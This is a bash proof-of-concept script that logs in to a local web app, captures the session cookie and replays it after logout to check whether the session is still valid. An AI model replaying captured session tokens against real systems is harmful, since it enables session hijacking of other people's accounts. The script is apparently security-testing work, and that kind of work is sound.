#!/bin/bash

# POC: Session Tokens Remain Valid After Logout
# This demonstrates that session tokens can be reused after logout

TARGET="http://localhost:8080"
BLUE='\033[0;34m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${BLUE}=========================================${NC}"
echo -e "${BLUE}POC: Session Reuse After Logout${NC}"
echo -e "${BLUE}=========================================${NC}\n"

# Step 1: Login and capture session token
echo -e "${YELLOW}[Step 1] Logging in to create authenticated session...${NC}"
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123" \
  2>&1)

# Extract session cookie
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "Set-Cookie: session=" | sed 's/.*session=\([^;]*\).*/\1/' | tr -d '\r\n')

if [ -z "$SESSION_COOKIE" ]; then
    echo -e "${RED}[ERROR] Failed to obtain session cookie. Login may have failed.${NC}"
    echo "Response:"
    echo "$LOGIN_RESPONSE"
    exit 1
fi

echo -e "${GREEN}[SUCCESS] Login successful${NC}"
echo -e "Session token: ${SESSION_COOKIE}\n"

# Step 2: Access protected resource with session token
echo -e "${YELLOW}[Step 2] Accessing protected dashboard with session token...${NC}"
DASHBOARD_BEFORE=$(curl -s -i -X GET "$TARGET/dashboard" \
  -H "Cookie: session=$SESSION_COOKIE" \
  2>&1)

DASHBOARD_STATUS_BEFORE=$(echo "$DASHBOARD_BEFORE" | grep "HTTP/" | head -1)

if echo "$DASHBOARD_BEFORE" | grep -q "HTTP/1.1 200\|HTTP/1.0 200"; then
    echo -e "${GREEN}[SUCCESS] Dashboard accessible - HTTP 200 OK${NC}"
    echo "Status: $DASHBOARD_STATUS_BEFORE"
else
    echo -e "${RED}[ERROR] Dashboard not accessible before logout${NC}"
    echo "Status: $DASHBOARD_STATUS_BEFORE"
    exit 1
fi

echo ""

# Step 3: Logout
echo -e "${YELLOW}[Step 3] Logging out...${NC}"
LOGOUT_RESPONSE=$(curl -s -i -X GET "$TARGET/logout" \
  -H "Cookie: session=$SESSION_COOKIE" \
  2>&1)

LOGOUT_STATUS=$(echo "$LOGOUT_RESPONSE" | grep "HTTP/" | head -1)
echo "Logout status: $LOGOUT_STATUS"

# Check for cookie deletion in response
if echo "$LOGOUT_RESPONSE" | grep -qi "Set-Cookie: session=.*Expires="; then
    echo -e "${GREEN}[INFO] Server sent cookie deletion header${NC}"
fi

echo ""

# Step 4: Try to reuse the session token after logout
echo -e "${YELLOW}[Step 4] Attempting to reuse session token AFTER logout...${NC}"
echo -e "Using same session token: ${SESSION_COOKIE}\n"

DASHBOARD_AFTER=$(curl -s -i -X GET "$TARGET/dashboard" \
  -H "Cookie: session=$SESSION_COOKIE" \
  2>&1)

DASHBOARD_STATUS_AFTER=$(echo "$DASHBOARD_AFTER" | grep "HTTP/" | head -1)

echo "Dashboard access after logout: $DASHBOARD_STATUS_AFTER"

# Check if we still got 200 OK (vulnerability confirmed)
if echo "$DASHBOARD_AFTER" | grep -q "HTTP/1.1 200\|HTTP/1.0 200"; then
    echo -e "\n${RED}=========================================${NC}"
    echo -e "${RED}VULNERABILITY CONFIRMED!${NC}"
    echo -e "${RED}=========================================${NC}"
    echo -e "${RED}Session token is STILL VALID after logout!${NC}"
    echo -e "${RED}The logout operation did NOT invalidate the session.${NC}"
    echo -e "\n${YELLOW}Impact:${NC}"
    echo -e "- Captured session tokens remain usable indefinitely"
    echo -e "- Logout provides false sense of security"
    echo -e "- Session hijacking persists after logout"
    exit 0
elif echo "$DASHBOARD_AFTER" | grep -q "HTTP/1.1 302\|HTTP/1.0 302"; then
    echo -e "\n${GREEN}=========================================${NC}"
    echo -e "${GREEN}Session properly invalidated${NC}"
    echo -e "${GREEN}=========================================${NC}"
    echo -e "Server redirected to login (session invalidated)"
    exit 1
else
    echo -e "\n${YELLOW}Unexpected response after logout${NC}"
    echo "$DASHBOARD_AFTER"
    exit 1
fi